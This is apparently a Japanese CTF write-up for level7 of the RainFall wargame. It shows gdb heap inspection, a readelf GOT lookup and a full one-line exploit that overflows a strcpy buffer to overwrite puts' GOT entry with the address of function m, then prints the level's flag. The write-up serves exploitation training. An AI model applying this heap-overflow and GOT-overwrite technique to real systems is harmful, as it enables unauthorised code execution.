# level7
## 方針

### コードが行ってることを整理する
puvar1[1]に2回目のmalloc、puvar3[1]に4回目のmalloc領域を割り当ててる。
それぞれのオブジェクトにargv[1]とargv[2]をstrcpyで書き込んでいる。

strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
strcpy((char *)puVar3[1],*(char **)(param_2 + 8));

puVar[1]をchar *キャストしてるからこれのpuVar1->puVar2(2回目のmalloc)の先にargv[1]を入れている。

puVar[3]をchar *キャストしてるからこれのpuVar1->puVar2(4回目のmalloc)の先にargv[2]を入れている。

heapは高アドレスに伸びていくからpuVar1[1]を書き換えればpuVar3[1]を書き換えられる。

fgetsが文字列を書き込んでるポインタをmがprintしている。mを呼び出せば.passが開ける。

putsのgotをgot overwriteしてmのアドレスに書き換える。

### 1回目と２回目のstrcpyのオフセットを調べる

2回目のstrcpy後にbp貼る
```
(gdb) disass main
Dump of assembler code for function main:
...
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
0x080485c2 <+161>:   mov    $0x80486e9,%edx
(gdb) b*0x080485c2
Breakpoint 1 at 0x80485c2

(gdb) r AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

(gdb) info registers
eax            0x804a038        134520888
(gdb) x/20x 0x804a018
0x804a018:      0x41414141      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x42424242      0x00000000
```
上記からpuVar1が0x804a018 、puVar3が0x804a038なのがわかる。
さらに0x804a028:  .... 0x0804a038で
puVar3までのオフセットが20だとわかる


### putsのgotを調べる
```
level7@RainFall:~$ readelf -r ./level7
...
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
```

### mのアドレスを調べる
```
(gdb) disass m
Dump of assembler code for function m:
0x080484f4 <+0>:     push   %ebp
```

### ans
第1引数: オフセットが20だから 20 + puts got
第2引数: putsに書き込むmのアドレス

```
level7@RainFall:~$ ./level7 $(python -c "import sys; sys.stdout.write('a' * 20 + '\x28\x99\x04\x08')") $(python -c "import sys; sys.stdout.write('\xf4\x84\x04\x08')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1745835602
```
## memo
